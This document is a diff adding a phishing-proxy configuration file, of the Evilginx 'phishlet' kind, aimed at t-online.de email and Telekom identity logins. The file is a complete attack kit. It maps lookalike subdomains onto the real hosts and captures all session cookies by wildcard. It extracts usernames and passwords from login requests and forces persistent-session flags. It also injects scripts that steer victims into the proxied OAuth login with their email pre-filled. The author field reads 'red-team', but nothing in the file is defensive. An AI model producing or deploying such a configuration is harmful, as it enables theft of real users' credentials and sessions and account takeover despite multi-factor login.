@@ -1,0 +1,199 @@
+name: "t-online"
+author: "red-team"
+min_ver: "3.0.0"
+
+proxy_hosts:
+  - {phish_sub: "tlogin", orig_sub: "accounts.login", domain: "idm.telekom.com", session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: "acctidm", orig_sub: "account", domain: "idm.telekom.com", session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: "portal", orig_sub: "www", domain: "t-online.de", session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: "mail", orig_sub: "email", domain: "t-online.de", session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: "idm", orig_sub: "idm", domain: "telekom.com", session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: "sso", orig_sub: "sso", domain: "telekom.com", session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: "acct", orig_sub: "accounts", domain: "telekom.com", session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: "cdn", orig_sub: "cdn-statics", domain: "telekom.com", session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: "static", orig_sub: "static", domain: "t-online.de", session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: "img", orig_sub: "img", domain: "t-online.de", session: false, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "accounts.login", domain: "idm.telekom.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "accounts.login", domain: "idm.telekom.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "account", domain: "idm.telekom.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "account", domain: "idm.telekom.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "www", domain: "t-online.de", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "www", domain: "t-online.de", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "email", domain: "t-online.de", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "email", domain: "t-online.de", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "idm", domain: "telekom.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "sso", domain: "telekom.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "accounts", domain: "telekom.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "cdn-statics", domain: "telekom.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "static", domain: "t-online.de", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "www", domain: "t-online.de", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"], redirect_only: true}
+  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "account", domain: "idm.telekom.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"], redirect_only: true}
+
+  - {triggers_on: "account.idm.telekom.com", orig_sub: "accounts.login", domain: "idm.telekom.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "account.idm.telekom.com", orig_sub: "account", domain: "idm.telekom.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "account.idm.telekom.com", orig_sub: "account", domain: "idm.telekom.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+
+  - {triggers_on: "www.t-online.de", orig_sub: "accounts.login", domain: "idm.telekom.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "www.t-online.de", orig_sub: "www", domain: "t-online.de", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "www.t-online.de", orig_sub: "email", domain: "t-online.de", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "www.t-online.de", orig_sub: "email", domain: "t-online.de", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "www.t-online.de", orig_sub: "idm", domain: "telekom.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "www.t-online.de", orig_sub: "sso", domain: "telekom.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "www.t-online.de", orig_sub: "static", domain: "t-online.de", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+
+  - {triggers_on: "email.t-online.de", orig_sub: "email", domain: "t-online.de", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "email.t-online.de", orig_sub: "email", domain: "t-online.de", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "email.t-online.de", orig_sub: "accounts.login", domain: "idm.telekom.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "email.t-online.de", orig_sub: "www", domain: "t-online.de", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+  - {triggers_on: "email.t-online.de", orig_sub: "static", domain: "t-online.de", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
+
+auth_tokens:
+  - domain: "accounts.login.idm.telekom.com"
+    keys: ['.*,regexp']
+
+  - domain: ".accounts.login.idm.telekom.com"
+    keys: ['.*,regexp']
+
+  - domain: "account.idm.telekom.com"
+    keys: ['.*,regexp']
+
+  - domain: ".account.idm.telekom.com"
+    keys: ['.*,regexp']
+
+  - domain: ".idm.telekom.com"
+    keys: ['.*,regexp']
+
+  - domain: ".telekom.com"
+    keys: ['.*,regexp']
+
+  - domain: "email.t-online.de"
+    keys: ['lisid', 'lisaMA', 'CNT', '.*,regexp']
+
+  - domain: ".email.t-online.de"
+    keys: ['lisid', 'lisaMA', 'CNT', '.*,regexp']
+
+  - domain: "www.t-online.de"
+    keys: ['.*,regexp']
+
+  - domain: ".t-online.de"
+    keys: ['.*,regexp']
+
+force_post:
+  - path: "/factorx*"
+    search:
+      - {key: "pw_pwd", search: ".*"}
+    force:
+      - {key: "persist_session", value: "on"}
+      - {key: "remember_user", value: "on"}
+      - {key: "persist_session_displayed", value: "1"}
+    type: "post"
+
+auth_urls:
+  - "/em*"
+  - "/api/openid_connect_login*"
+  - "/auth/login/oauth2/code/telekom*"
+
+credentials:
+  username:
+    key: "(^pw_usr$|^username$|^login$|^anmeldename$|^t-online-id$|^email$)"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "(^pw_pwd$|^password$|^passwd$|^passwort$|^pass$|^userPassword$)"
+    search: "(.*)"
+    type: "post"
+  custom:
+    - key: "hidden_usr"
+      search: "(.*)"
+      type: "post"
+    - key: "username_json"
+      search: '"username"\s*:\s*"([^"]*)'
+      type: "json"
+    - key: "password_json"
+      search: '"password"\s*:\s*"([^"]*)'
+      type: "json"
+
+login:
+  domain: "www.t-online.de"
+  path: "/"
+
+js_inject:
+  - trigger_domains: ["www.t-online.de"]
+    trigger_paths: ["/"]
+    trigger_params: []
+    script: |
+      window.addEventListener('load', function() {
+        var parts = window.location.hostname.split('.');
+        parts[0] = 'tlogin';
+        var tloginHost = parts.join('.');
+        var loginUrl = 'https://' + tloginHost + '/oauth2/auth?response_type=code&client_id=10LIVESAM30000004901PORTALE2000000000000&scope=openid&redirect_uri=https%3A%2F%2Fwww.t-online.de%2Fauth%2Flogin%2Foauth2%2Fcode%2Ftelekom&claims=%7B%22id_token%22%3A%7B%22urn%3Atelekom.com%3Aall%22%3Anull%7D%7D&display=popup';
+        var hash = window.location.hash;
+        if (hash && hash.length > 1) { loginUrl += hash; }
+        window.location.href = loginUrl;
+      });
+
+  - trigger_domains: ["www.t-online.de"]
+    trigger_paths: ["/auth/login/oauth2/code/telekom*"]
+    trigger_params: []
+    script: |
+      window.addEventListener('load', function() {
+        var parts = window.location.hostname.split('.');
+        parts[0] = 'mail';
+        var mailHost = parts.join('.');
+        window.location.href = 'https://' + mailHost + '/em';
+      });
+
+  - trigger_domains: ["accounts.login.idm.telekom.com"]
+    trigger_paths: ["/*"]
+    trigger_params: []
+    script: |
+      window.addEventListener('load', function() {
+        function waitForElm(selector) {
+          return new Promise(resolve => {
+            if (document.querySelector(selector)) return resolve(document.querySelector(selector));
+            const observer = new MutationObserver(() => {
+              if (document.querySelector(selector)) {
+                resolve(document.querySelector(selector));
+                observer.disconnect();
+              }
+            });
+            observer.observe(document.body, { childList: true, subtree: true });
+          });
+        }
+
+        var hash = window.location.hash.slice(1);
+        if (hash.length === 0) return;
+        var email = decodeURIComponent(hash);
+
+        var selectors = [
+          'input[name="username"]',
+          'input[name="login"]',
+          'input[name="t-online-id"]',
+          'input[name="id"]',
+          'input[type="email"]',
+          'input[type="text"]'
+        ];
+
+        var found = false;
+        for (var i = 0; i < selectors.length; i++) {
+          var el = document.querySelector(selectors[i]);
+          if (el) {
+            el.value = email;
+            el.dispatchEvent(new Event('input', {bubbles: true}));
+            el.dispatchEvent(new Event('change', {bubbles: true}));
+            found = true;
+            break;
+          }
+        }
+
+        if (!found) {
+          waitForElm('input[type="email"], input[type="text"], input[name="username"]').then(function(el) {
+            el.value = email;
+            el.dispatchEvent(new Event('input', {bubbles: true}));
+            el.dispatchEvent(new Event('change', {bubbles: true}));
+          });
+        }
+      });
+      
